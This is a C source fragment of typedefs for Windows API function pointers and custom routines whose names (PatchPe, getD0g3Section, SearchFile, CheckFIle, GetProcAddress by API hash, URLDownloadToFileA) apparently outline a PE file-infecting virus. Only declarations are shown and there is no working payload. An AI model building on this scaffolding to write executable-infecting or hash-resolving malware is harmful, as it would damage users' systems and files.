#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Windows.h>


typedef HMODULE(__stdcall* tAPI_LoadLibraryA)(
	LPCSTR lpLibFileName
	);
typedef HANDLE(__stdcall* tAPI_CreateFileA)(
	LPCSTR                lpFileName,
	PVOID                 dwDesiredAccess,
	PVOID                 dwShareMode,
	LPSECURITY_ATTRIBUTES lpSecurityAttributes,
	PVOID                 dwCreationDisposition,
	PVOID                 dwFlagsAndAttributes,
	HANDLE                hTemplateFile
	);
typedef BOOL(__stdcall* tAPI_ReadFile)(
	HANDLE       hFile,
	LPVOID       lpBuffer,
	PVOID        nNumberOfBytesToRead,
	LPDWORD      lpNumberOfBytesRead,
	LPOVERLAPPED lpOverlapped
	);
typedef BOOL(__stdcall* tAPI_WriteFile)(
	HANDLE       hFile,
	LPCVOID      lpBuffer,
	PVOID        nNumberOfBytesToWrite,
	LPDWORD      lpNumberOfBytesWritten,
	LPOVERLAPPED lpOverlapped
	);
typedef PVOID(__stdcall* tAPI_SetFilePointer)(
	HANDLE hFile,
	LONG   lDistanceToMove,
	PLONG  lpDistanceToMoveHigh,
	PVOID  dwMoveMethod
	);
typedef BOOL(__stdcall* tAPI_CloseHandle)(
	HANDLE hObject
	);
typedef DWORD  (WINAPI *tAPI_GetFileSize)(
	 HANDLE hFile,
	 LPDWORD lpFileSizeHigh
);
typedef HGLOBAL(__stdcall* tAPI_GlobalAlloc)(
	UINT   uFlags,
	SIZE_T dwBytes
	);
typedef HGLOBAL(__stdcall* tAPI_GlobalFree)(
	HGLOBAL hMem
	);
typedef HANDLE(__stdcall* tAPI_FindFirstFileA)(
	LPCSTR             lpFileName,
	LPWIN32_FIND_DATAA lpFindFileData
	);
typedef BOOL(__stdcall* tAPI_FindNextFileA)(
	HANDLE             hFindFile,
	LPWIN32_FIND_DATAA lpFindFileData
	);
typedef BOOL(__stdcall* tAPI_FindClose)(
	HANDLE hFindFile
	);
typedef PVOID(__stdcall* tAPI_GetModuleHandleA)(
	LPCSTR lpModuleName
	);
typedef  BOOL(__stdcall* tAPI_DeleteFileA)(
	LPCSTR lpFileName
	);
typedef BOOL(__stdcall* tAPI_FreeLibrary)(
	HMODULE hModule
	);
typedef  VOID(__stdcall* tAPI_Sleep)(
	PVOID dwMilliseconds
	);
typedef  PVOID(WINAPI* tAPI_GetCurrentDirectoryA)(
	PVOID nBufferLength,
	LPSTR lpBuffer
	);
typedef HRESULT(WINAPI* tAPI_URLDownloadToFileA)(
	LPUNKNOWN, LPCSTR, LPCSTR, PVOID, LPBINDSTATUSCALLBACK
	);
typedef PVOID(WINAPI* tAPI_mciSendStringA)(
	LPCSTR, LPSTR, UINT, HWND
	);


typedef	DWORD	(__stdcall* tdqx_memcmp)(char* x, char* y, int len);
typedef void    (__stdcall* tdqx_memcpy)(char* x, char* y, int len);
typedef DWORD   (__stdcall* tdqx_strlen)(char* X);
typedef void    (__stdcall* tdqx_strcat)(char* x, char* y);
typedef PVOID   (__stdcall* tdqx_strfind)(char* x, char y);
typedef DWORD	(__stdcall* tdqx_Align)(DWORD dwSize, DWORD dwAlign);
typedef VOID   (__stdcall* tdqx_PatchPe)(PVOID f_Name);
typedef PVOID   (__stdcall* tdqx_getD0g3Section)();
typedef DWORD	(__stdcall* tdqx_CheckFIle)(PVOID f_Name);
typedef void    (__stdcall* tdqx_SearchFile)();
typedef void    (__stdcall* tdqx_Music)();
typedef void    (__stdcall* tdqx_FrameWork)(char* directory);
typedef HMODULE (__stdcall* tdqx_GetModuleHandle)(WCHAR* lpName);
typedef FARPROC (__stdcall* tdqx_GetProcAddress)(HMODULE hModule, DWORD API_hash);
typedef int     (__stdcall* tdqx_strcmpA)(const char* psza, const char* pszb);
typedef int     (__stdcall* tdqx_stricmpW)(const wchar_t* pwsza, const wchar_t* pwszb);
typedef	void	(__stdcall* tdqx_InitImport)();